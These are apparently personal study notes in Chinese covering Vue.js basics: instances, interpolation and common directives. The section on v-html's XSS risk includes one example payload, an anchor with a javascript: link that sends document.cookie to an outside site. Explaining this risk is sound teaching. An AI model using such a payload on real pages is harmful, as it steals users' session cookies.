# Vue

###  创建

想让Vue工作，就必须创建一个Vue实例，且要传入一个配置对象。
被Vue接管的容器中的代码依然符合html规范，只不过混入了一些特殊的Vue语法。
root容器里的代码被称为【Vue模板】
Vue实例和容器是一一对应的
真实开发中只有一个Vue实例，并且会配合着组件一起使用
{{xxx}}中的xxx要写js表达式，且xxx就可以自动读取到data中的所有属性
一旦data中的数据发生改变，那么页面中用到该数据的地方也会自动更新

```html
<!-- 准备一个容器 -->
<div id="root">
    <h1>
        Hell,{{name}}
    </h1>
</div>
<script type="text/javascript">
    Vue.config.productionTip = false // 阻止vue在启动时生成生产提示
    // 创建Vue实例
    new Vue({
        el:'#root', //el用于指定当前Vue实例为哪个容器服务，值通常为css选择器字符串。
        data:{ //data中用于存储数据，数据供el所指定的容器去使用，值现在暂时先写成一个对象，后面换成函数。
            name:'xiaoming'
        }
    })
</script>
```



#### 模板语法

##### 插值

功能：用于解析标签体内容
写法：{{xxx}}，xxx是js表达式，且可以直接读取到data中的所有属性
文本 {{}}

纯HTML

v-html,防止XSS,CSRF(
    1.前端过滤
    2.后台转义`(<> &lt;&gt;)`
    3.给cookie加上属性http
)

```js
<a href=javascript:location.href='http://www.baidu.com?cookie='+document.cookie>click</a>
```

##### 指令

是带有v-前缀的特殊属性
功能：用于解析标签（包括：标签属性，标签内容，绑定事件。。。）
v-bind 动态绑定属性

    缩写：:src

Vue中有两种数据绑定的方式：

- 单向绑定（v-bind）:数据只能从data流向页面。
- 双向绑定（v-model）:数据不仅能从data流向页面，还可以从页面流向data
  - 双向绑定一般都应用在表单类元素上（如input,select）
  - v-model:value可以简写为v-model，因为v-model默认收集的就是value值。

v-if 动态创建/删除

v-show 动态显示/隐藏

v-on:click 绑定事件

    缩写：@click

v-for 遍历

v-model 双向绑定表单
